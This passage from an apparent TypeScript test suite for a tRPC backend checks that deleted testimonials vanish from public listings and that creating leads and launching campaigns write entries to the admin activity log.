    expect(testimonial).toBeDefined();

    await adminCaller.testimonials.delete({ id: testimonial!.id });

    // Check from public context
    const publicCtx = makeUnauthCtx();
    const publicCaller = appRouter.createCaller(publicCtx);
    const after = await publicCaller.testimonials.list({});
    const deleted = after.find((t) => t.id === testimonial!.id);
    expect(deleted).toBeUndefined();
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 9: ACTIVITY LOGGING
// ═══════════════════════════════════════════════════════════════════════════════

describe("ACTIVITY LOGGING: Operations are logged", () => {
  it("lead creation generates activity log", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    const adminCtx = makeAdminCtx();
    const adminCaller = appRouter.createCaller(adminCtx);

    await caller.leads.create({ firstName: "LogTest", lastName: "Activity", email: "logtest@test.com" });

    const logs = await adminCaller.admin.activityLogs({ limit: 5 });
    expect(logs.length).toBeGreaterThan(0);
    const logEntry = logs.find((l) => l.action === "created" && l.entityType === "lead");
    expect(logEntry).toBeDefined();
  });

  it("campaign launch generates activity log", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    const adminCtx = makeAdminCtx();
    const adminCaller = appRouter.createCaller(adminCtx);

    await caller.campaigns.create({ name: "Log Launch Test", channels: ["sms"], goal: "appointments" });
    const campaigns = await caller.campaigns.list({});
    const campaign = campaigns.campaigns.find((c) => c.name === "Log Launch Test");
    await caller.campaigns.launch({ id: campaign!.id });

    const logs = await adminCaller.admin.activityLogs({ limit: 5 });
    const logEntry = logs.find((l) => l.action === "launched" && l.entityType === "campaign");
    expect(logEntry).toBeDefined();
  });
});
